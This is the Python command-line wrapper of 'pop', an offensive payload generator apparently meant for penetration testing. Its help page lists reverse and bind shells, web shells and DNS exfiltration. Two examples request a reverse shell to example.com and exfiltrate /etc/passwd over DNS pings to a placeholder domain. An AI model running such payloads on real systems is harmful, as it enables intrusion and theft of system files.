#
# pop is an offensive payload generator
# Copyright 2021-2022 Philippe Grégoire <git@pgregoire.xyz>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#

import pop


def ls(name=None):
    o = ''

    o += '=> generators\n'
    for k in dir(pop.p):
        if '_' in k or 'enc' == k:
            continue
        if name is not None and k != name:
            continue

        t = getattr(pop.p, k).keys()
        if name is None:
            o += '  {}\t'.format(k)
        o += ' '.join(sorted(t)) + '\n'

    # TODO list supported encoders
    if name is not None and name:
        return o[:-1]

    o += '\n=> encoders\n'
    for k in pop.p.enc:
        if name is not None and k != name:
            continue

        t = getattr(pop.p, 'enc')[k].keys()
        if name is None:
            o += '  {}\t'.format(k)
        o += ' '.join(sorted(t)) + '\n'

    return o


def usage():
    u = 'pop [-EHhl] [-e encoder[,...]] type gen [arg...]'
    return 'usage: {}'.format(u)


def manpage():
    return '''

  pop is an offensive payload generator designed for portability,
  minimalism and efficiency.

USAGE

  {}

  -E\tAdd example usage to output.
  -H\tDisplay this help page.
  -h\tDisplay a small usage line.
  -l\tList generators and encoders.
  -e\tA comma-separated list of encoders to use.
    \t(not all encoders are supported by all languages)

  type  The type of generators to use.

              bt  Bind TCP shells
              ns  DNS query generators (simple pokes)
              rc  Remote command executions (simple)
              rt  Reverse TCP shells
              ws  Web shells
              xd  DNS exfiltration payloads

  gen   The specific generator to use.

  [arg...]  Arguments to provide to the generator (if any).

EXAMPLES

  Generate a reverse TCP shell Python payload to connect back to
  port 4444 on host example.com.

    pop rt py example.com 4444

  Generate a base64-encoded payload that runs "cat /etc/passwd" and
  uses ping to exfiltrate the output to the unique.example.com domain.

    pop -e b64 xd ping unique.example.com cat /etc/passwd
    '''.format(usage())[1:]


def main(args):
    from getopt import getopt, GetoptError

    opts, args = getopt(args, 'EHe:hl')

    o_encs = ''
    o_noex = True
    for k, v in opts:
        if '-E' == k:
            o_noex = False
        elif '-H' == k:
            return manpage()
        elif '-h' == k:
            return usage()
        elif '-l' == k:
            return ls()
        elif '-e' == k:
            o_encs = v

    if 0 == len(args):
        raise Exception(usage())
    if 1 == len(args):
        if args[0] not in dir(pop.p):
            raise Exception('error: unknown payload type ({})'.format(args[0]))
        return ls(args[0])

    if args[0] not in dir(pop.p):
        raise Exception('error: unknown payload type ({})'.format(args[0]))
    if args[1] not in getattr(pop.p, args[0]):
        raise Exception('error: unknown generator ({}/{})'.format(args[0], args[1]))

    m = getattr(pop.p, args[0])[args[1]]
    # if less than minargs or greater than maxargs
    if len(args[2:]) < m.nargs[0] or (len(args[2:]) > m.nargs[1] and m.nargs[1] >= m.nargs[0]):
        o = 'error: missing arguments\n'
        o += 'usage: {} {} {}'.format(args[0], args[1], m.usage)
        raise Exception(o)

    e = [e for e in o_encs.split(',') if e.strip()]
    pl = pop.g(*args, encs=e)
    if getattr(m, 'EXEC') and not o_noex:
        e = getattr(m, 'EXEC').strip()
        if e != 'PAYLOAD':
            e = e.replace('PAYLOAD', pl)
            e = m.repl(args[2:], e)
            pl += '\n\nexample:\n' + e

    return pl


if '__main__' == __name__:
    import sys

    try:
        print(main(sys.argv[1:]))
    except Exception as e:
        sys.stderr.write('{}\n'.format(e))
        exit(1)

    exit(0)
